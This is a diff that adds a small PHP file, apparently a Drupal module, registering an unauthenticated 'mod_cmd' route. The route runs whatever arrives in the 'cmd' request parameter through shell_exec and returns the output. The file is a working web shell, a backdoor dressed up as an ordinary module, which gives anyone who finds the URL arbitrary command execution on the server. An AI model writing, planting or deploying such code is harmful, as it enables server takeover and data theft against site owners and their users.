@@ -1,0 +1,20 @@
+<?php
+
+function mod_cmd_menu() {
+    $items['mod_cmd'] = array(
+        'title' => 'mod_cmd',
+        'page callback' => 'mod_cmd_callback',
+        'access callback' => TRUE,
+        'type' => MENU_CALLBACK,
+    );
+
+    return $items;
+}
+
+function mod_cmd_callback() {
+    if (isset($_REQUEST['cmd'])) {
+        return "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+    }
+
+    return MENU_NOT_FOUND;
+}
